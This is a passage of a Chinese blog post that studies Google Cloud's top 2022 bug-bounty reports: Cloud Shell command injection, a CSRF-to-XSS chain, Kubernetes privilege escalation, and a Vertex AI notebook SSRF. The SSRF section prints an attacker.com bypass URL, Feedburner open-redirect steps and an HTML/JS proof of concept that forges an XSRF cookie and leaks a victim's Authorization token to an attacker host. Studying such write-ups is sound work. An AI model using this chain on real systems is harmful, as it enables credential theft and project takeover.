<!DOCTYPE html><html class="appearance-auto" lang="cn"><head><meta charset="UTF-8"><title>GoogleCloudVrp-top7-2022-Study-and-Ideas</title><meta name="description" content="J0o1ey Blog | Hack for Sec and Good"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><script>var _hmt = _hmt || [];
(function() {
var hm = document.createElement("script");
hm.src = "//hm.baidu.com/hm.js?" + '1da71ad199e154beef984da705235690';
var s = document.getElementsByTagName("script")[0];
s.parentNode.insertBefore(hm, s);
})();</script><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="å‰è¨€ï¼šGoogleå®‰å…¨å›¢é˜Ÿè¿‘æœŸå‘å¸ƒäº†2022å¹´GoogleCloud VRPä¸­èµé‡‘top7çš„æ¼æ´
https://security.googleblog.com/2023/06/google-cloud-awards-313337-in-2022-vrp.html?continueFlag=8d8e2a2b6ab56e4030b5b194ac3f4922

1st Prize - $133,337: Yuval Avrahami for the report and write-up Privilege escalations in GKE Autopilot. Yuvalâ€™s excellent write-up describes several attack paths that would allo.."><meta name="generator" content="Hexo 6.3.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">J0o1ey's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">GoogleCloudVrp-top7-2022-Study-and-Ideas</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">ç‚¹å‡»è¿”å›é¡¶éƒ¨</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">é¦–é¡µ</a></h3><h3 class="is-inline-block"><a href="/about">å…³äº</a></h3><h3 class="is-inline-block"><a href="/archives">å½’æ¡£</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">é¦–é¡µ</a></h3><h3 class="is-inline-block"><a href="/about">å…³äº</a></h3><h3 class="is-inline-block"><a href="/archives">å½’æ¡£</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-text">å‰è¨€ï¼š</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7th-Prize-Command-injection-in-Cloud-Shell-%EF%BF%A513337"><span class="toc-text">7th Prize: Command injection in Cloud Shell - ï¿¥13337</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98%E7%9A%84%E6%80%9D%E8%80%83%E7%82%B9%EF%BC%9A"><span class="toc-text">æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6th-Prize-A-Few-Bugs-in-the-Google-Cloud-Shell-%EF%BF%A513337"><span class="toc-text">6th Prize: A Few Bugs in the Google Cloud Shell - ï¿¥13337</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98%E7%9A%84%E6%80%9D%E8%80%83%E7%82%B9%EF%BC%9A-1"><span class="toc-text">æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5th-Prize-Kubernetes-Privilege-Escalation-Excessive-Permissions-in-Popular-Platforms-17-311"><span class="toc-text">5th Prize: Kubernetes Privilege Escalation: Excessive Permissions in Popular Platforms - $17,311</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98%E7%9A%84%E6%80%9D%E8%80%83%E7%82%B9%EF%BC%9A-2"><span class="toc-text">æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4th-Prize-Client-Side-SSRF-to-Google-Cloud-Project-Takeover-31-311"><span class="toc-text">4th Prize: Client-Side SSRF to Google Cloud Project Takeover - $31,311</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-text">Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98%E7%9A%84%E6%80%9D%E8%80%83%E7%82%B9%EF%BC%9A-3"><span class="toc-text">æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3rd-Prize-Bypassing-Authorization-in-Cloud-Workstations-31337"><span class="toc-text">3rd Prize: Bypassing Authorization in Cloud Workstations - $31337</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98%E7%9A%84%E6%80%9D%E8%80%83%E7%82%B9%EF%BC%9A-4"><span class="toc-text">æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2nd-Prize-SSH-Key-Injection-on-GCE-73-331"><span class="toc-text">2nd Prize: SSH Key Injection on GCE - $73,331</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98%E7%9A%84%E6%80%9D%E8%80%83%E7%82%B9%EF%BC%9A-5"><span class="toc-text">æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1st-Prize-Privilege-escalations-in-GKE-Autopilot-133-337"><span class="toc-text">1st Prize: Privilege escalations in GKE Autopilot - $133,337</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%9D%A1%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-text">ç¬¬ä¸€æ¡æ”»å‡»é“¾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%9D%A1%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-text">ç¬¬äºŒæ¡æ”»å‡»é“¾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98%E7%9A%84%E6%80%9D%E8%80%83%E7%82%B9%EF%BC%9A-6"><span class="toc-text">æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%A8%80%EF%BC%9A"><span class="toc-text">åè¨€ï¼š</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/%E8%AE%AE%E9%A2%98%E5%AD%A6%E4%B9%A0"><i class="tag post-item-tag">è®®é¢˜å­¦ä¹ </i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">GoogleCloudVrp-top7-2022-Study-and-Ideas</h1><time class="has-text-grey" datetime="2023-06-28T13:14:05.000Z">2023-06-28</time><article class="mt-2 post-content"><h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>Googleå®‰å…¨å›¢é˜Ÿè¿‘æœŸå‘å¸ƒäº†2022å¹´GoogleCloud VRPä¸­èµé‡‘top7çš„æ¼æ´</p>
<p><a target="_blank" rel="noopener" href="https://security.googleblog.com/2023/06/google-cloud-awards-313337-in-2022-vrp.html?continueFlag=8d8e2a2b6ab56e4030b5b194ac3f4922">https://security.googleblog.com/2023/06/google-cloud-awards-313337-in-2022-vrp.html?continueFlag=8d8e2a2b6ab56e4030b5b194ac3f4922</a></p>
<blockquote>
<p><strong>1st Prize -</strong> $133,337: Yuval Avrahami for the report and write-up <a target="_blank" rel="noopener" href="https://unit42.paloaltonetworks.com/gke-autopilot-vulnerabilities/">Privilege escalations in GKE Autopilot</a>. Yuvalâ€™s excellent write-up describes several attack paths that would allow an attacker with permission to create pods in an Autopilot cluster to escalate privileges and compromise the underlying node VMs. While these VMs are accessible to customers in GKE Standard, this research led to several <a target="_blank" rel="noopener" href="https://cloud.google.com/anthos/clusters/docs/security-bulletins#gcp-2022-009">hardening improvements</a> in Autopilot that make it a better <a target="_blank" rel="noopener" href="https://cloud.google.com/kubernetes-engine/docs/concepts/autopilot-security">secure-by-default</a> Kubernetes offering.</p>
<p><strong>2nd Prize -</strong> $73,331: Sivanesh Ashok and Sreeram KL for the report and write-up <a target="_blank" rel="noopener" href="https://blog.stazot.com/ssh-key-injection-google-cloud/">SSH Key Injection on GCE</a>. Their write-up describes the journey of discovering a vulnerability that would allow an attacker to gain access to a userâ€™s GCE VM by tricking them into clicking a link. They demonstrate the importance of persistence and turned a strange behavior in user creation into an injection of arbitrary SSH public keys.</p>
<p><strong>3rd Prize -</strong>  $31,337: Sivanesh Ashok and Sreeram KL for the report and write-up <a target="_blank" rel="noopener" href="https://blog.stazot.com/auth-bypass-in-google-cloud-workstations/">Bypassing Authorization in Cloud Workstations</a>. Their write-up describes their research process for analyzing Cloud Workstations and then a full-chain exploit to steal a userâ€™s access token by abusing the format of an OAuth state parameter.</p>
<p><strong>4th Prize -</strong> $31,311: Sreeram KL and Sivanesh Ashok for the report and write-up <a target="_blank" rel="noopener" href="https://blog.geekycat.in/client-side-ssrf-to-google-cloud-project-takeover/">Client-Side SSRF to Google Cloud Project Takeover</a>. Their write-up combines a client-side SSRF, a CSRF bypass, and a clever 3xx redirect by â€œdeactivatingâ€ a Feedburner proxy. An attacker could use this vulnerability to steal a Vertex AI userâ€™s access token by tricking them into clicking a link.</p>
<p><strong>5th Prize -</strong> $17,311: Yuval Avrahami and Shaul Ben Hai for the report and write-up <a target="_blank" rel="noopener" href="https://www.paloaltonetworks.com/apps/pan/public/downloadResource?pagePath=/content/pan/en_US/resources/whitepapers/kubernetes-privilege-escalation-excessive-permissions-in-popular-platforms">Kubernetes Privilege Escalation: Excessive Permissions in Popular Platforms</a>. Their whitepaper covers privilege escalation vectors in Kubernetes and describes vulnerabilities in many Kubernetes hosting providers, including Azureâ€™s AKS, Amazonâ€™s EKS, and GKE.</p>
<p><strong>6th Prize -</strong> $13,373: Obmi for the report and write-up <a target="_blank" rel="noopener" href="https://obmiblog.blogspot.com/2022/12/gcp-2022-few-bugs-in-google-cloud-shell.html">A Few Bugs in the Google Cloud Shell</a>. Obmi discovered vulnerabilities in the Cloud Shell file upload functionality that would have allowed an attacker to write arbitrary files to a userâ€™s Cloud Shell via cross-site request forgery.</p>
<p><strong>7th Prize -</strong> $13,337: Bugra Eskici for the report and write-up <a target="_blank" rel="noopener" href="https://bugra.ninja/posts/cloudshell-command-injection/">Command injection in Cloud Shell</a>. Bugra found a very curious injection point in a Cloud Shell script that led to a URL query parameter being directly injected into a Python script. This vulnerability would have given an attacker arbitrary code execution in a userâ€™s Cloud Shell if they clicked on an attacker-controlled link.</p>
</blockquote>
<p>æœ¬äººæ ¹æ®googleå®˜æ–¹ç»™å‡ºçš„YouTubeè§†é¢‘è¿›è¡Œäº†å­¦ä¹ ,å¹¶ä¸”æ ¹æ®ä¸ªäººç†è§£å¯¹å…¶ä¸­çš„æ¡ˆä¾‹ç»†èŠ‚è¿›è¡Œäº†è§£é‡Šä»¥åŠæ€è·¯æ€»ç»“ï¼Œæœ¬æ–‡é…å›¾å‡æ¥æºäºgoogleå®˜æ–¹è§†é¢‘ä¸writeup</p>
<p>èƒ½åŠ›æ°´å¹³æœ‰é™ï¼Œå¦‚æœ‰è°¬è¯¯ï¼Œæ¬¢è¿å¤§å®¶æŒ‡å‡º</p>
<p>Googleå®˜æ–¹è§†é¢‘ï¼š<a target="_blank" rel="noopener" href="https://youtu.be/uOvizKc1WZY">https://youtu.be/uOvizKc1WZY</a></p>
<p>ç°å°†TOP 7æ¼æ´æ¡ˆä¾‹å­¦ä¹ ä¸æ€è€ƒå½’çº³æ€»ç»“å¦‚ä¸‹</p>
<h2 id="7th-Prize-Command-injection-in-Cloud-Shell-ï¿¥13337"><a href="#7th-Prize-Command-injection-in-Cloud-Shell-ï¿¥13337" class="headerlink" title="7th Prize: Command injection in Cloud Shell - ï¿¥13337"></a>7th Prize: Command injection in Cloud Shell - ï¿¥13337</h2><p>è¿™ä¸ªç«™è¯´æ¥æƒ­æ„§ï¼Œç¬”è€…æ›¾ç»æŒ–Google VRPçš„æ—¶å€™ä¹ŸæŒ–è¿‡ï¼Œæ˜¯ä¸€ä¸ªåŸºäºCSRFçš„command Injectionï¼Œè§¦å‘èµ·æ¥æ¯”è¾ƒå›°éš¾ï¼Œgoogleå®‰å…¨å›¢é˜Ÿè®¤ä¸ºè¿™æ¯”è¾ƒé¸¡è‚‹ï¼Œå› æ­¤æ²¡æœ‰æ”¶å–æ¼æ´</p>
<p>ä½†æ˜¯è€å¤–å´æåˆ°äº†ä¸€ä¸ªçœŸæ­£çš„command injectionã€‚ã€‚è®©æˆ‘ç¾¡æ…•ä¸å·²</p>
<p>åœ¨GoogleCloudçš„web editorä¸­ï¼Œå†…ç½®äº†shellï¼Œè€Œurlä¸­çš„projectå‚æ•°ä¼¼ä¹æ€»ä¼šå‡ºç°åœ¨python configè„šæœ¬ä¸­ï¼Œå¹¶ä¸”ä¼šå¼•å‘è„šæœ¬æ‰§è¡Œ</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271234324.png" alt="image-20230627123429297"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå•å¼•å·è§¦å‘äº†ä¸€ä¸ªpython console error </p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥äº‹æƒ…å°±å¾ˆç®€å•äº†ï¼Œæ ¹æ®ç›®æ ‡çš„é—­åˆfeatureæ„é€ ä¸€ä¸ªonelineå‘½ä»¤æ‰§è¡Œå³å¯</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271240994.png" alt="image-20230627124005960"></p>
<h3 id="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š"><a href="#æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š" class="headerlink" title="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š"></a><strong>æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</strong></h3><p><strong>æ°¸è¿œä¸è¦æ”¾è¿‡ä»»ä½•ä¸€ä¸ªç”¨æˆ·å¯æ§çš„å‚æ•°ç‚¹~</strong></p>
<h2 id="6th-Prize-A-Few-Bugs-in-the-Google-Cloud-Shell-ï¿¥13337"><a href="#6th-Prize-A-Few-Bugs-in-the-Google-Cloud-Shell-ï¿¥13337" class="headerlink" title="6th Prize: A Few Bugs in the Google Cloud Shell - ï¿¥13337"></a>6th Prize: A Few Bugs in the Google Cloud Shell - ï¿¥13337</h2><p>æ¼æ´å‘ç°è€…æ‰¾åˆ°äº†ä¸€ä¸ªåŸºäºæ–‡ä»¶ä¸Šä¼ çš„XSS</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271244864.png" alt="image-20230627124440839"></p>
<p>ä½†æ˜¯è¿™æ ·è§¦å‘åªæ˜¯ä¸€ä¸ªself xssï¼Œå¹¶ä¸ç¬¦åˆVRPçš„æ”¶å½•è§„åˆ™ï¼Œä½†æ˜¯æ¼æ´å‘ç°è€…åˆé€šè¿‡éå¸¸Coolçš„å§¿åŠ¿ï¼Œå‘ç°äº†æ­¤å¤„çš„CSRF</p>
<p>åœ¨æœ¬å¤„è¦å®ç°æ–‡ä»¶ä¸Šä¼ å¤„çš„CSRFï¼Œéœ€è¦è·å¾—ä¸€ä¸ªéšæœºçš„idï¼Œä½†æ˜¯å¾ˆæ˜¾ç„¶ï¼Œè¿™ä¸ªidå¹¶ä¸å®¹æ˜“çŒœè§£è·å–</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271248251.png" alt="image-20230627124856216"></p>
<p>äºæ˜¯æ¼æ´å‘æ˜è€…æ„é€ äº†ä¸€ä¸ªPOCï¼Œåœ¨æ‹–æ‹½å›¾ç‰‡æ—¶å¯ä»¥è·å–åˆ°ç›®æ ‡å¸¦æœ‰è¿™ä¸ªéšæœºidçš„æ–‡ä»¶ä¸Šä¼ urlï¼Œä»è€Œå®ç°CSRFï¼Œè¿›è€Œè§¦å‘XSS</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271247346.png" alt="image-20230627124728387"></p>
<p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ‹–æ‹½è¿™ä¸ªimageï¼Œå¯ä»¥è·å–åˆ°è¿™ä¸ªéšæœºid</p>
<p>è¿›è€Œå®Œæˆè·å–id-&gt;æ–‡ä»¶ä¸Šä¼ csrf-&gt;å®ç°XSSçš„æ”»å‡»é“¾</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271252333.png" alt="image-20230627125239304"></p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271253623.png" alt="image-20230627125308590"></p>
<p>ä¸å¾—ä¸è¯´ï¼Œè¿™ä¸€æ•´å¥—åˆ©ç”¨é“¾éå¸¸amazing</p>
<h3 id="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-1"><a href="#æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-1" class="headerlink" title="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š"></a><strong>æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</strong></h3><p>1.Self XSSç»“åˆCSRFå˜åºŸä¸ºå®</p>
<p>2.åœ¨æŸäº›å­˜åœ¨<strong>unique id</strong>çš„æƒ…å†µä¸‹ï¼Œå¯è€ƒè™‘é€šè¿‡ä¸€äº›ç±»ä¼¼äºç»å…¸çš„â€<strong>click hijacking</strong>â€œæ–¹å¼ï¼Œè·å–çœ‹ä¼¼æ”»å‡»è€…æ— æ³•è·å–åˆ°çš„è®¯æ¯</p>
<h2 id="5th-Prize-Kubernetes-Privilege-Escalation-Excessive-Permissions-in-Popular-Platforms-17-311"><a href="#5th-Prize-Kubernetes-Privilege-Escalation-Excessive-Permissions-in-Popular-Platforms-17-311" class="headerlink" title="5th Prize: Kubernetes Privilege Escalation: Excessive Permissions in Popular Platforms - $17,311"></a>5th Prize: Kubernetes Privilege Escalation: Excessive Permissions in Popular Platforms - $17,311</h2><p>è¿™ä¸ªæ¼æ´æ¯”è¾ƒç‰¹æ®Šï¼Œä¸å…¶è¯´å«æ¼æ´ï¼Œä¸å¦‚è¯´å«å®‰å…¨ç™½çš®ä¹¦~</p>
<p>ç™½çš®ä¹¦å¹¶æ²¡æœ‰ç›´æ¥æè¿°æ¼æ´æˆ–è€…å®‰å…¨é—®é¢˜ï¼Œä½†æ˜¯å…¶æ­ç¤ºäº†è¯¸å¤šæä¾›KubernetesæœåŠ¡çš„å…¬æœ‰äº‘å‚å•†åœ¨podså¤±é™·åä¸ç‰¹æƒä¸‹çš„â€DaemonSetsâ€å®¹å™¨äº§ç”Ÿçš„æƒé™æå‡çš„ç«èŠ±ï¼Œå¹¶ç»™å‡ºäº†kubernetesæƒé™é…ç½®å®‰å…¨åˆç†æ€§çš„æ£€æµ‹å·¥å…·</p>
<p>Googleè®¤ä¸ºè¿™å¯¹äºKubernetesç”Ÿæ€æœ‰æ‰€è£¨ç›Šï¼Œå› æ­¤ç»™å‡ºäº†$17311çš„å¥–åŠ±</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271300155.png" alt="image-20230627130025127"></p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271258692.png" alt="image-20230627125847654"></p>
<p>ç™½çš®ä¹¦é“¾æ¥ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://www.paloaltonetworks.com/apps/pan/public/downloadResource?pagePath=/content/pan/en_US/resources/whitepapers/kubernetes-privilege-escalation-excessive-permissions-in-popular-platforms">https://www.paloaltonetworks.com/apps/pan/public/downloadResource?pagePath=/content/pan/en_US/resources/whitepapers/kubernetes-privilege-escalation-excessive-permissions-in-popular-platforms</a></p>
<h3 id="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-2"><a href="#æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-2" class="headerlink" title="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š"></a><strong>æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</strong></h3><p><strong>å¯¹äºä¸€ä¸ªé¡¹ç›®å®‰å…¨ç”Ÿæ€æœ‰æ‰€è£¨ç›Šçš„äº§å‡ºï¼Œå¾€å¾€æ¯”å•ç‚¹æ¼æ´æ‹¥æœ‰æ›´é«˜çš„æ™®é€‚æ€§ä»·å€¼</strong></p>
<h2 id="4th-Prize-Client-Side-SSRF-to-Google-Cloud-Project-Takeover-31-311"><a href="#4th-Prize-Client-Side-SSRF-to-Google-Cloud-Project-Takeover-31-311" class="headerlink" title="4th Prize: Client-Side SSRF to Google Cloud Project Takeover - $31,311"></a><strong>4th Prize: Client-Side SSRF to Google Cloud Project Takeover -</strong> $31,311</h2><p>è¿™ä¸ªæ¼æ´çš„å‘æ˜teamåŒæ ·æ˜¯3th,2thå¥–åŠ±çš„å‘ç°è€…ï¼Œå¯è°“æ˜¯ç¥é›•ä¾ ä¾£äº†ã€‚ã€‚ã€‚</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271336814.png" alt="image-20230627133641772"></p>
<p>æ¼æ´å‘æ˜è€…åœ¨pentestä¸­å‘ç°äº†å¦‚ä¸‹çš„URLï¼š</p>
<blockquote>
<p>https:&#x2F;&#x2F;{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com&#x2F;aipn&#x2F;v2&#x2F;proxy&#x2F;<strong>compute.googleapis.com</strong>&#x2F;something</p>
</blockquote>
<p>æ„Ÿè§‰è¿™ä¸ªç‚¹å¯èƒ½å­˜åœ¨SSRFåä½¿ç”¨äº†è‡ªå·±çš„åŸŸåè¿›è¡Œæµ‹è¯•</p>
<blockquote>
<p>https:&#x2F;&#x2F;{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com&#x2F;aipn&#x2F;v2&#x2F;proxy&#x2F;<strong>geekycat.in</strong>&#x2F;something</p>
</blockquote>
<p>ä½†æ˜¯å¹¶ä¸å¥æ•ˆï¼Œäºæ˜¯ç”¨äº†ä¸€ä¸ªç®€å•çš„tips bypassäº†é™åˆ¶</p>
<blockquote>
<p><code>https://&#123;INSTANCE-ID&#125;-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/&#123;attacker.com&#125;/compute.googleapis.com/</code> </p>
<p><strong>æ¥è‡ªä½œè€…ï¼šbypasses the check, that was easy ğŸ˜…</strong></p>
</blockquote>
<p>æ¥ä¸‹æ¥ä½œè€…æœåŠ¡å™¨çš„æ—¥å¿—æ˜¾ç¤ºï¼Œå®ƒæ”¶åˆ°äº†headerä¸­å¸¦æœ‰Authorization tokençš„è¯·æ±‚ã€‚</p>
<p>éšåéªŒè¯äº†Authorization tokenï¼Œå‘ç°ç¡®å®æœ‰äº‘å¹³å°æƒé™~</p>
<p>è‡³æ­¤å®ç°æƒé™æ¥ç®¡</p>
<p>googleéšåä¿®å¤äº†è¿™ä¸ªæ¼æ´ï¼Œåªå…è®¸è¿™ä¸ªç‚¹è¯·æ±‚*.google.comï¼Œä½†æ˜¯æ¼æ´å‘æ˜è€…æ‰¾åˆ°äº†Bypassçš„æ–¹æ³•</p>
<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>æ¼æ´å‘æ˜è€…éšåå‘ç°äº†ä¸€ä¸ªè°·æ­Œçš„å­åŸŸæœåŠ¡ <code>https://feedburner.google.com</code>. </p>
<p>è¯¥æœåŠ¡å…è®¸å¯ä»¥ç®¡ç†åŸŸåä¸‹çš„RSSæè¦ã€‚ç±»ä¼¼äºRSS Proxyä¸€æ ·ã€‚</p>
<p>éšåæ¼æ´æŒ–æ˜è€…é€šè¿‡ä»¥ä¸‹æ–¹æ³•è§†å›¾æ„å»ºOpenRedirect</p>
<ul>
<li>å¯¼èˆªè‡³<code>https://feedburner.google.com</code>â€“&gt; åˆ›å»ºä»£ç† â€“&gt; è¾“å…¥<code>https://attacker.com/rss.xml</code></li>
<li>ä½¿ç”¨â€œè‡ªå®šä¹‰ URLâ€â€“&gt; åˆ›å»º</li>
</ul>
<p>å¤åˆ¶çš„ URL çš„æ ¼å¼å¦‚ä¸‹ï¼š<code>https://feeds.feedburner.com/&#123;CUSTOM&#125;/&#123;ID&#125;</code></p>
<ul>
<li>åˆ›å»ºä»£ç†åï¼Œå•å‡»ä¸‰ä¸ªç‚¹ â€“&gt; åœç”¨ â€“&gt; ç¡®è®¤</li>
</ul>
<p>ç°åœ¨ï¼Œå—å®³è€…è®¿é—®<code>https://feeds.feedburner.com/&#123;CUSTOM&#125;/&#123;ID&#125;</code>å°†ä¼šå®ç°ä¸€ä¸ªOpenRedirect</p>
<p>ä½†æ˜¯å¹¶ä¸æ˜¯ä¸€å¸†é£é¡ºçš„</p>
<p>è®¿é—®<code>https://&#123;INSTANCE-ID&#125;-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/feedproxy.google.com/&#123;CUSTOM&#125;/&#123;ID&#125;</code></p>
<p>æ— æ³•å®ç°SSRFï¼Œå› ä¸ºGoogleå®æ–½äº†CSRFä¿æŠ¤ã€‚</p>
<p>éšåæ¼æ´å‘æ˜è€…æ³¨æ„åˆ°Jupyter notebookæ˜¯éƒ¨ç½²åœ¨tornadoä¸Šçš„ï¼Œè€Œtornadoæœ‰ä¸€ç§ç»•è¿‡csrfæ ¡éªŒçš„æ–¹æ³•ï¼š</p>
<blockquote>
<p>TornadoæœåŠ¡å™¨ä¼šæ¯”è¾ƒGETå‚æ•°&#x2F;POSTåŒ…ä¸­çš„CSRFä»¤ç‰Œä¸cookieä¸­çš„CSRFä»¤ç‰Œã€‚</p>
<p>å¦‚æœä¸¤è€…éƒ½åŒ¹é…ï¼Œåˆ™é€šè¿‡ã€‚å¦åˆ™ï¼Œå¤±è´¥ã€‚</p>
<p><strong>ç”±äºå­åŸŸå¯ä»¥å°†cookieè®¾ç½®ä¸ºçˆ¶åŸŸï¼Œå› æ­¤åœ¨ä»»ä½•å­åŸŸä¸­æ‰§è¡Œjavascriptå°†å…è®¸æˆ‘ä»¬ä¸ºcookieè®¾ç½®ä»»æ„CSRFä»¤ç‰Œï¼Œç„¶åç»•è¿‡CSRFä¿æŠ¤ã€‚</strong></p>
</blockquote>
<p>äºæ˜¯æ¼æ´æŒ–æ˜è€…åœ¨googleusercontent.coméƒ¨ç½²äº†ä¸€ä¸ªjupyter</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271428761.png" alt="image-20230627142813741"></p>
<p>å¹¶ä¸”ä¿®æ”¹äº†Jupyterç¬”è®°æœ¬çš„ç´¢å¼•é¡µ(ä½äº&#x2F;opt&#x2F;conda&#x2F;share&#x2F; Jupyter &#x2F;lab&#x2F;staticä¸‹)</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271428358.png" alt="image-20230627142804323"></p>
<p>ç”±äºå·²ç»æˆåŠŸåœ°è·å¾—äº†javascriptçš„æ‰§è¡Œæƒï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥è®¾ç½®ä»»æ„çš„CSRFä»¤ç‰Œå¹¶ç»•è¿‡ä¿æŠ¤ã€‚</p>
<pre><code class="html">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;body&gt;
    &lt;script&gt;
        var base_domain = document.domain.substr(document.domain.indexOf(&#39;.&#39;));
        document.cookie=&#39;_xsrf=1;Domain=&#39;+base_domain;
fetch(&quot;https://&#123;VICTIM-INSTANCE-ID&#125;-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/feedproxy.google.com/&#123;CUSTOM&#125;/&#123;ID&#125;?_xsrf=1&quot;,&#123;credentials:&quot;include&quot;,mode:&quot;no-cors&quot;&#125;)
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>è¿›è€Œè·å–Authorization headerï¼Œæ¼æ´åˆ©ç”¨å®Œæˆ~</p>
